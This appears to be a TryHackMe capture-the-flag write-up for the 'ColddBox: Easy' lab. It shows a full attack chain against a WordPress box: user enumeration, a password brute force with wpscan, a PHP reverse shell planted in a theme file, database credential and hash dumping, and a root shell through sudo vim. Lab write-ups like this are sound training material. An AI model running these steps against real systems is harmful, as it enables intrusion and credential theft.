# ColddBox: Easy [THM](https://tryhackme.com/room/colddboxeasy)

__Title__: ColddBox: Easy write-up  
__Description__: An easy level machine with multiple ways to escalate privileges.  
__summary__: Using wpscan we were able to find few users then a password which gave use access to the admin where we could edit a PHP to open a reverse shell and escalate our privileges using the information store in the wordpress config  
__Tags__:  Wordpress, wpscan, Gobuster  

![homepage image of ColddBox](https://github.com/clobee/images/blob/main/Screenshot_2021-01-10%20ColddBox%20One%20more%20machine.png)

---  

## Enumeration

### Platform information

Running nmap show us a web server running on 

```bash
$ nmap -p- 10.10.204.183 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 21:59 GMT
Nmap scan report for 10.10.204.183
Host is up (0.040s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.41 seconds
```
```bash
$ nmap -sC -sV -A -oN nmap-initial 10.10.204.183 -p80,4512

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 22:00 GMT
Nmap scan report for 10.10.204.183
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.39 seconds
```

Looks like we are working with a Wordpress site

```bash
$ whatweb http://10.10.204.183/

http://10.10.204.183/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.204.183], JQuery[1.11.1], MetaGenerator[WordPress 4.1.31], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[ColddBox | One more machine], WordPress[4.1.31], x-pingback[/xmlrpc.php]
```

### Wordpress Scan: User enumeration

```bash
$ wpscan --url http://10.10.204.183/ -e

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### Directories listing

Running gobuster we have found some interesting folders

```bash
$ gobuster dir -u http://10.10.204.183 -w /usr/share/wordlists/OneListForAll/onelistforallshort.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.204.183
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/OneListForAll/onelistforallshort.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/10 21:24:09 Starting gobuster
===============================================================
/index.php (Status: 301)
/wp-login.php (Status: 200)
/wp-admin/ (Status: 302)
//./secret/.. (Status: 301)
/wp-content (Status: 301)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
/hidden/ (Status: 200)
/.htaccess (Status: 403)
/.htaccess.bak (Status: 403)
/.htpasswd (Status: 403)
/server-status (Status: 403)
/server-status?full (Status: 403)
/server-status?full&showmodulestate (Status: 403)
/license.txt (Status: 200)
/.hta (Status: 403)
/xmlrpc.php (Status: 200)
/.httpd.conf (Status: 403)
/wp-config.php (Status: 200)
/./secret/.. (Status: 301)
```

```bash
$ curl http://10.10.204.183/hidden/
<!DOCTYPE html>
<html>
<head>
<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
<title>Hidden Place</title>
</head>
<body>
<div align="center">
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
</div>
</body>
</html> 
```

### Wordpress user bruteforce

```bash
$ wpscan --url http://10.10.204.183/ -U c0ldd,hugo,philip -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

Thanks to Wpscan, we now have a valid access to wordpress

![Wordpress edit header page](https://github.com/clobee/images/blob/main/Screenshot_2021-01-10_22-17-16.png)

## Server access

### Server access: www-data user

Let's copy the content of a PHP reverse shell `/usr/share/webshells/php/php-reverse-shell.php` into the `header.php` of the current theme

Let's start netcat in our Kali 

```bash
$ nc -nvlp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Visiting the site main page

```bash
curl http://10.10.204.183
```

We get a shell on the victim server

```bash
$ nc -nvlp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.204.183.
Ncat: Connection from 10.10.204.183:57426.
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:23:23 up  1:30,  0 users,  load average: 0.00, 0.65, 3.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$  
```

### Database access

First of all, let's get a stable shell

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"; export TERM=xterm
```

Looks like we have some users on the server

```bash
www-data@ColddBox-Easy:/$ cat /etc/passwd | grep 'bin/bash'

root:x:0:0:root:/root:/bin/bash
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
```

Looking into the `wp-config.php` we can get the access to the database

```bash
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

Let's go get some content from the database 

```bash
www-data@ColddBox-Easy:/var/www/html$ mysql -u c0ldd -pcybersecurity

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 41847
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| colddbox           |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use colddbox;
use colddbox;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [colddbox]> show tables;     
show tables;
+-----------------------+
| Tables_in_colddbox    |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

MariaDB [colddbox]> describe wp_users;
describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(64)         | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   |     |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(60)         | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

MariaDB [colddbox]> select count(id) from wp_users;
select count(id) from wp_users;
+-----------+
| count(id) |
+-----------+
|         3 |
+-----------+
1 row in set (0.00 sec)


MariaDB [colddbox]> select id, user_login, user_pass from wp_users \G;
select id, user_login, user_pass from wp_users \G;
*************************** 1. row ***************************
        id: 1
user_login: c0ldd
 user_pass: $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1
*************************** 2. row ***************************
        id: 2
user_login: hugo
 user_pass: $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/
*************************** 3. row ***************************
        id: 4
user_login: philip
 user_pass: $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y.
3 rows in set (0.00 sec)

```


## Privilege escalation

### www-data -> c0ldd

Using the information found earlier in the wp-config.php

```bash

```bash
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

We can get access to c0ldd ssh acccount

```bash
$ ssh c0ldd@10.10.204.183 -p 4512
The authenticity of host '[10.10.204.183]:4512 ([10.10.204.183]:4512)' can't be established.
ECDSA key fingerprint is SHA256:xDx1I3ynEOfBDWPnJPLQG+C4XjZhBw/6Rig/bz2tMxM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.204.183]:4512' (ECDSA) to the list of known hosts.
c0ldd@10.10.204.183's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


Pueden actualizarse 66 paquetes.
44 actualizaciones son de seguridad.


Last login: Mon Oct 19 18:48:20 2020 from 10.0.1.4
c0ldd@ColddBox-Easy:~$ cat /home/c0ldd/user.txt
```

### c0ldd -> root

Let's see how we can get better privileges. 
Looks like we can run `vim`

```bash
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Luckily (for us), `vim` is does not drop the elevated privileges and can be use to escalate our privileged access

```bash
c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'

# id                               
uid=0(root) gid=0(root) grupos=0(root)

# cat /root/root.txt 
```
